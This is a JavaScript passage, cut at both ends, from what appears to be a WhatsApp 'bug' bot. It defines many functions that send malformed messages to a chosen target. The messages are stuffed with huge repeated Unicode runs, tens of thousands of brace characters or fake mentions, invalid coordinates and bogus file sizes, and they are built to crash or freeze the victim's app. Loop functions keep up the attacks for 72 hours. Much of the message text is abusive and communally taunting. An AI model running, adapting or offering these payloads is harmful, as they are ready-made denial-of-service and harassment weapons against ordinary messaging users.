_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let msg = await generateWAMessageFromContent(
X, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "🩸⃟༑⌁⃰𝙅𝘼𝙔 𝙎𝙃𝙍𝙀𝙀 𝙍𝘼𝙈 ཀ‌‌🦠" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: InJectXploit,
},
{
name: "call_permission_request",
buttonParamsJson: InJectXploit + "{",
},
],
},
},
},
},
}, {}
);

await XeonBotInc.relayMessage(X, msg.message, {
messageId: msg.key.id,
participant: {
jid: X
},
});
}

async function BetonSeks(target) {
  try {
    const buttons = Array(300).fill().map(() => ({
      name: "galaxy_message",
      buttonParamsJson: ""
    }));

    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "Prosses test your chat core" + "\n ewe ewe ah button",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                ...buttons
              ],
            },
          },
        },
      },
    };

    await XeonBotInc.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function frezbuttoninvis(target) {
    const spamMessage = "@1".repeat(10200);
    const crashMessage = "ꦽ".repeat(10200);
    
    
    const MSG = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "'HACKED BY 🕉️HINDU",
                    previewType: "🅃🄴🅁🄸 🄼🄰🄰 🄺🄸 🄲🄷🅄🅃",
                    contextInfo: {
                        mentionedJid: [
                            target,
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 30000 },
                                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await XeonBotInc.relayMessage(
        target,
        {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "ᴊᴀʏ sʜʀᴇᴇ ʀᴀᴍ 🚩 ᴍʏ ᴠɪᴄᴛᴏᴍ" },
                    content: undefined
                }
            ]
        }
    );
}

async function crashNewIos(target) {
await XeonBotInc.relayMessage(target, {
  contactsArrayMessage: {
    displayName: "‼️⃟ ༚ IN COMING KING IS BACK MOTU PATLU ‌‌‌‌⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
    contacts: [
      {
        displayName: "‼️⃟ ༚ IN COMING KING IS BACK MOTU PATLU ‌‌‌‌⋆>",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ QRIS AJA YAH ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ IN COMING KING IS BACK MOTU PATLU ‌‌‌‌⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      },
      {
        displayName: "‼️⃟ ༚ IN COMING KING IS BACK MOTU PATLU‌‌‌‌⋆>",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ LINUX ‌‌⋆>;;;\nFN:‼️⃟ ༚ IN COMING KING IS BACK MOTU PATLU ‌‌‌‌⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    ],
    contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      quotedAd: {
        advertiserName: "x",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "x"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}


async function newdelay(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 5) {
        await delay(target),
        console.log(chalk.yellow(`MOTU PATLU BUG 🐞ACTIVE ${count + 1}/1 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 1 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 1 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 10000));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function motuking(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 5) {
        await frezbuttoninvis(target),
        console.log(chalk.yellow(`MOTU PATLU BUG 🐞ACTIVE ${count + 1}/5 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 5 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 5 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 1000));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function iziiinvissversi1(Target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(Target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: " masukan teks disini ",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: " teri maa ki chut "
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(90000)
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

async function crashui(target) {
  await XeonBotInc.relayMessage(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "",
          contentText: "‌‏@1*🦠𖢳*".repeat(5000),
          footerText: "",
          buttons: [{
            buttonId: ".a",
            buttonText: { displayText: "X" },
            type: 1
          }],
          headerType: 1
        }
      }
    }
  }, { participant: { jid: target } });

  await XeonBotInc.relayMessage(target, {
    locationMessage: {
      degreesLatitude: -6.2,
      degreesLongitude: 106.8166,
      name: "U-",
      address: "ClipperX",
      jpegThumbnail: Buffer.alloc(0) 
    }
  }, { participant: { jid: target } });
}

async function chatFrezze(target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await XeonBotInc.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{participant:{jid:target}})
}
let xx = {"url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN0oZNr6-kfN5YWoC1cdu2hEJ4VBgXpp41NeQkRtkVb2lDTyjBL4J8yMMfYgJ0YWZRgZdiUzCqAV5EYTeq7FcaysmAPj53twFH-dr0e4Q?ccb=9-4&oh=01_Q5Aa2AEnGl7IbMFtdCLGyFb8_d08Q7WVgIUC193324MQoouEiA&oe=68A159D3&_nc_sid=e6ed6c&mms3=true","mimetype": "image/jpeg","fileSha256": "l5PXVvy1P0tnS0y8+eg0AwS4og/GLOuSW0OI/ZDgZEE=","fileLength": "367077","height": 1395,"width": 1200,"mediaKey": "rTYEhP0o5UbHDasXyfvpsAgXsh3SNnsPQKzoPKQ50gw=","fileEncSha256": "6tK2h/KEpqgW5W5Qx9SnmBhZpSs4Y6V2Ac7UoDjdSvY=","directPath": "/o1/v/t24/f2/m238/AQN0oZNr6-kfN5YWoC1cdu2hEJ4VBgXpp41NeQkRtkVb2lDTyjBL4J8yMMfYgJ0YWZRgZdiUzCqAV5EYTeq7FcaysmAPj53twFH-dr0e4Q?ccb=9-4&oh=01_Q5Aa2AEnGl7IbMFtdCLGyFb8_d08Q7WVgIUC193324MQoouEiA&oe=68A159D3&_nc_sid=e6ed6c"}
for (let s = 0; s < 2; s++) {
const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{participant:{jid:target}})
const xz = await XeonBotInc.relayMessage(target, xy.message, {messageId:xy.key.id,participant:{jid:target}})
xx.caption = "𑲱".repeat(100000);
XeonBotInc.relayMessage(target, {
"protocolMessage": {
    "type": "MESSAGE_EDIT",
    "key": {
        "fromMe": true,
        "remoteJid": target,
        "id": xz
    },
    "editedMessage": {
        "imageMessage": xx
    }
}
},{participant:{jid:target}})
await sleep(100)
}
}

async function FcUiFlows(sock, target) {
  const mentionedJidList = [
    target,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 2000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const Params = "{[(".repeat(20000);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "</𖥂 Agya motu\\>"
          },
          nativeFlowMessage: {
            messageParamsJson: Params,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "send_location",
                buttonParamsJson: "{}"
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "form_message",
                buttonParamsJson: ""
              },
              {
                name: "catalog_message",
                buttonParamsJson: ""
              },
              {
                name: "review_and_pay",
                buttonParamsJson: ""
              },
              {
                name: "mpm",
                buttonParamsJson: ""
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardingScore: 250208,
            isForwarded: false,
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  await sleep(1);

  await XeonBotInc.sendMessage(target, { delete: msg.key });
}

async function MOTUPATLU(target) {
    const kontol = () => proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "🅷🅴🅻🅻🅾 𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗜𝗦 𝗖𝗢𝗠𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗛𝗔𝗧‌",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: '{"status":true}' }
                        ],
                        messageParamsJson: "{".repeat(20000),
                    },
                },
            },
        }
    });

    const messageIds = [];

    for (let i = 0; i < 3; i++) {
        const msg = await generateWAMessageFromContent(target, kontol(), {
            userJid: XeonBotInc.user.id
        });

        const messageId = msg.key.id;
        messageIds.push(messageId);

        await XeonBotInc.relayMessage(target, msg.message, { participant: { jid:target },messageId });
       await sleep(800)
    }

    for (let i = 0; i < messageIds.length; i++) {
        const id = messageIds[i];
        await sleep(1000)
        await XeonBotInc.sendMessage(target, {
            delete: {
                remoteJid: target,
                fromMe: false,
                id,
                participant: XeonBotInc.user.id
            }
        });
    }
    console.log(`MOTU PATLU IS COMING : ${target} FUCK YOU!`);
}

async function RansFchard(target) {
for (let r = 0; r < 1; r++) {
try {
let msg = await generateWAMessageFromContent(
  target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          header: {
            title: "",
              hasMediaAttachment: false,
              locationMessage: {
              degreesLatitude: 1e309,
              degreesLongitude: -1e309,
              name: '{'.repeat(50000),
              address: '{'.repeat(50000),
              },
            },
           contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [" 0@s.whatsapp.net"]
          },
            body: {
              text: "ʜᴇʟʟᴏ 👋 ʜɪɴᴅᴜ",
            },
            nativeFlowMessage: {
              messageParamsJson: '{'.repeat(50000),
            },
          },
        },
      },
    },
    {}
  );
  await XeonBotInc.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
} catch (err) {
console.log("Error Sending Bug", err);
}
console.log(`Succesfuly Sending Bug ${target}`) 
}
}

async function NotifKill(maklo) {
  const jembot = {
    extendedTextMessage: {
      text: "\u0000" + "ꦽ".repeat(90000),
      contextInfo: {
        fromMe: false,
        stanzaId: XeonBotInc.generateMessageTag(),
        participant: maklo,
        quotedMessage: {
          conversation: "\u0000" + "ꦽ".repeat(90000),
        },
        disappearingMode: {
          initiator: 1,
          trigger: 2,
        },
      },
      inviteLinkGroupTypeV2: "DEFAULT",
    },
  };

  await XeonBotInc.relayMessage(
    maklo,
    { message: jembot },
    {
      messageId: null,
      additionalAttributes: {
        participant: maklo,
      },
    }
  );

  console.log("\x1b[33m%s\x1b[0m", `Successfully Sent UI System Bug`);
}

async function CrashCalls(isTarget) {
var CallPermission = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo: {
mentionedJid: [m.chat],
isForwarded: true,
forwardingScore: 999
},
body: {
text: "MOTU PATLU HER" + "ꦾ".repeat(9999),
footer: "T-Яyuichi"
},
nativeFlowMessage: {
buttons: [
{ 
name: "single_select", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "mpm", 
buttonParamsJson: "" 
}
]
}
}
}
}
};
await XeonBotInc.relayMessage(isTarget, CallPermission, { participant: { jid: isTarget } });
}

async function sbh(target) {
  const sbh = [
    {
      tag: 'call',
      attrs: {
        from: client.user.id,
        to: true,
        id: '1234567890ABCDEF',
      },
      content: [
        {
          tag: 'offer',
          attrs: {
            'call-id': true,
            'call-creator': target,
          },
          content: true,
        }
      ]
    }
  ];

  const phynx = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "99999999999",
                    height: 9999,
                    width: 9999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: " ~ raldzz`executive ~ ",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𑲭".repeat(61111)
                },
                footer: {
                  text: " ℍ𝔸ℂ𝕂𝔼𝔻 𝔹𝕐 𝕄𝕆𝕋𝕌 ℙ𝔸𝕋𝕃𝕌 "
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(99999),
                  buttons: Array(99).fill({
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({
                      status: "𛀠" })
                  })
                }
              }
            ]
          },
          contextInfo: {
            stanzaId: client.generateMessageTag(),
            participant: target,
            remoteJid: "@s.whatsapp.net",
            mentionedJid: [ target,
            ...Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net` ) ],
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(target, phynx.message, 
  {
    participant: { jid: target },
    additionalNodes: null,
    messageId: phynx.key.id
  });
  console.log(`SUCCESS SEND BUGS FORCECLOSE SBH`);
}

async function NikaFC(target) {
for (let r = 0; r < 1; r++) {
try {
let msg = await generateWAMessageFromContent(
  target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          header: {
            title: "",
              hasMediaAttachment: false,
              locationMessage: {
              degreesLatitude: 1e309,
              degreesLongitude: -1e309,
              name: '{'.repeat(50000),
              address: '{'.repeat(50000),
              },
            },
           contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [" 0@s.whatsapp.net"]
          },
            body: {
              text: "Nika.js",
            },
            nativeFlowMessage: {
              messageParamsJson: '{'.repeat(50000),
            },
          },
        },
      },
    },
    {}
  );
  await XeonBotInc.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
} catch (err) {
console.log("Error Sending Bug", err);
}
console.log("Nika Menyerang Target 😠 ")
}
}
//==============================================================\\


async function InvisHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await XeonBotInc.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
//==============================================================\\
async function xoutios(target) {
    const xeonIpong = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/webp",
                            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                            fileName: fileName,
                            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1746112211"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @DGXeon13","flow_id":"Telegram: @DGXeon13","flow_message_version":"9.903","flow_token":"Telegram: @DGXeon13"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @Am_itachiuchiha" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${xeonIpong}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await XeonBotInc.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("Telegram: @MOTU_PATALU_HINDU_HAI", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await XeonBotInc.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: xeonIpong,
            url: "https://youtube.com/@MR_MOTU_PATLUBY"
        }
    }, { participant: { jid: target } });

await XeonBotInc.relayMessage(target, {
        'extendedTextMessage': {
            'text': xeonIpong,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': 'Telegram: @MOTU_PATALU_HINDU_HAI' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "samSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await XeonBotInc.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @MOTU_PATALU_HINDU_HAI" + xeonIpong,
            url: "https://youtube.com/@MR_MOTU_PATLUBY"
        }
    }, { participant: { jid: target } });
    
